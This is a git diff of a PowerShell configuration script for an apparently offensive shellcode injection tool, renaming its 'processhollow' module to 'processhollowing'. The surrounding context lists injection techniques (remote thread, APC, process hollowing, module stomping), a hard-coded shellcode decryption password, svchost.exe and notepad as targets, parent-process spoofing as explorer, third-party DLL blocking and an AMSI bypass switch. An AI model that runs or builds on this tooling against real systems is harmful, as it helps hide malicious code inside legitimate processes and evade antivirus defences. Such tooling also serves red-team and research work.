@@ -15,7 +15,7 @@ Module name. Choose from:
   "remotethreadkernelcb",
   "remotethreadapc",
   "remotethreadcontext",
-  "processhollow",
+  "processhollowing",
   "modulestomping"
 #>
 $A = "currentthread"
@@ -35,13 +35,13 @@ $E = "enc"
 # password to decrypt the shellcode
 $F = "Passw0rd!"
 
-# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext", "processhollow" and "modulestomping")
+# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 $G = "C:\Windows\System32\svchost.exe"
 
 # existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended" and "remotethreadkernelcb")
 $H = "notepad"
 
-# parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext", "processhollow" and "modulestomping")
+# parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 $I = "explorer"
 
 # loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
@@ -53,7 +53,7 @@ $K = "xpsservices.dll"
 # exported function to overwrite (used in "modulestomping")
 $L = "DllCanUnloadNow"
 
-# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollow" and "modulestomping")
+# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 $M = "True"
 
 # bypass AMSI ("True" / "False")
@@ -66,7 +66,7 @@ if ($methods.Contains($A)) {
     $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
 }
 
-$methods = @("remotethreadapc", "remotethreadcontext", "processhollow", "modulestomping")
+$methods = @("remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
 if ($methods.Contains($A)) {
     try {
         $I = (Get-Process $I -ErrorAction Stop).Id
